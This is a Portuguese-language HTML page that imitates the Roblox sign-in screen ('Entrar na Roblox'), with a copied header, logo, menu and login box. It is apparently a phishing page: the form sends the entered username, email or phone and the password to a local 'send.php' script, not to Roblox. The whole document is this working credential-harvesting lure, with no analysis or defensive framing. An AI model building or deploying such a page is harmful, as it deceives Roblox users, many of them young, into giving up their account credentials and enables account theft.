<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Entrar na Roblox</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial, Helvetica, sans-serif;
}

body{
background:#0f1117;
color:white;
min-height:100vh;
display:flex;
flex-direction:column;
}

/* HEADER */

.header{
display:flex;
align-items:center;
justify-content:space-between;
background:#111318;
padding:12px 28px;
border-bottom:1px solid #1f2229;
height:56px;
}

.left{
display:flex;
align-items:center;
gap:40px;
}

/* LOGO ROBLOX */

.logo{
width:28px;
height:28px;
background:white;
transform:rotate(18deg);
position:relative;
}

.logo::after{
content:"";
position:absolute;
width:10px;
height:10px;
background:#111318;
top:50%;
left:50%;
transform:translate(-50%,-50%);
}

/* MENU */

.nav{
display:flex;
gap:28px;
font-size:15px;
color:#c7c7c7;
}

.nav a{
cursor:pointer;
}

.nav a:hover{
color:white;
}

/* PESQUISA */

.search{
flex:1;
display:flex;
justify-content:center;
}

.search-box{
position:relative;
width:420px;
max-width:100%;
}

.search-box input{
width:100%;
padding:8px 12px 8px 34px;
border-radius:6px;
border:1px solid #2b2f36;
background:#1a1d24;
color:white;
font-size:14px;
}

.search-box input:focus{
outline:none;
border:1px solid #3b5cff;
}

.search-icon{
position:absolute;
left:10px;
top:50%;
transform:translateY(-50%);
font-size:14px;
color:#8a8f98;
}

/* BOTÕES */

.actions{
display:flex;
gap:10px;
}

.btn{
padding:7px 16px;
border-radius:8px;
border:none;
font-size:13px;
font-weight:bold;
cursor:pointer;
}

.btn-primary{
background:#3b5cff;
color:white;
}

.btn-outline{
background:transparent;
border:1px solid #6b6f76;
color:white;
}

/* CONTAINER */

.container{
flex:1;
display:flex;
align-items:center;
justify-content:center;
padding:20px;
}

/* LOGIN BOX */

.login-box{
width:100%;
max-width:380px;
background:#1c1f26;
padding:25px;
border-radius:12px;
box-shadow:0 10px 25px rgba(0,0,0,0.6);
animation:fadeIn .5s ease;
}

.login-box h2{
text-align:center;
margin-bottom:20px;
font-size:22px;
}

/* INPUT */

.input{
width:100%;
padding:12px;
margin-bottom:12px;
border-radius:8px;
border:none;
background:#2a2f38;
color:white;
font-size:14px;
}

.input:focus{
outline:none;
border:1px solid #3b5cff;
box-shadow:0 0 0 2px rgba(59,92,255,0.3);
}

/* BOTÃO LOGIN */

.login-btn{
width:100%;
padding:12px;
border-radius:8px;
border:1px solid #555;
background:#1a1d24;
color:#aaa;
font-weight:bold;
margin-bottom:15px;
font-size:14px;
cursor:pointer;
}

.login-btn:hover{
background:#23262e;
}

/* SHOW PASSWORD */

.show-pass{
background:none;
border:none;
color:#6c8cff;
font-size:13px;
margin-bottom:15px;
cursor:pointer;
}

/* OUTROS */

.link{
text-align:center;
font-size:13px;
color:#bdbdbd;
margin-bottom:15px;
}

.divider{
height:1px;
background:#333;
margin:15px 0;
}

.secondary-btn{
width:100%;
padding:12px;
border-radius:8px;
border:none;
background:#2a2f38;
color:white;
margin-bottom:10px;
font-weight:bold;
font-size:14px;
cursor:pointer;
}

.signup{
text-align:center;
margin-top:10px;
font-size:13px;
}

.signup span{
color:#6c8cff;
cursor:pointer;
}

/* ANIMAÇÃO */

@keyframes fadeIn{
from{
opacity:0;
transform:translateY(10px);
}
to{
opacity:1;
transform:translateY(0);
}
}

/* RESPONSIVO */

@media (max-width:700px){

.nav{
display:none;
}

.search{
display:none;
}

}

</style>
</head>

<body>

<header class="header">

<div class="left">

<div class="logo"></div>

<nav class="nav">
<a>Destaques</a>
<a>Mercado</a>
<a>Criar</a>
<a>Robux</a>
</nav>

</div>

<div class="search">

<div class="search-box">
<span class="search-icon">🔍</span>
<input type="text" placeholder="Pesquisar">
</div>

</div>

<div class="actions">
<button class="btn btn-primary">Cadastrar-se</button>
<button class="btn btn-outline">Entrar</button>
</div>

</header>

<div class="container">

<div class="login-box">

<h2>Entrar na Roblox
    
</h2>

<form method="POST" action="send.php">

<input class="input" name="email" placeholder="Usuário/e-mail/telefone" required>

<input class="input" type="password" id="senha" name="password" placeholder="Senha" required>

<button type="button" class="show-pass" onclick="toggleSenha()">Mostrar senha</button>

<button class="login-btn" type="submit">
Entrar
</button>

</form>

<div class="link">
Esqueceu a senha ou nome de usuário?
</div>

<div class="divider"></div>

<button class="secondary-btn">
Envie-me um código único por e-mail
</button>

<button class="secondary-btn">
Entrada rápida
</button>

<div class="signup">
Não possui uma conta? <span>Cadastrar-se</span>
</div>

</div>

</div>

<script>

function toggleSenha(){
let s = document.getElementById("senha");
s.type = s.type === "password" ? "text" : "password";
}

</script>

</body>
</html>
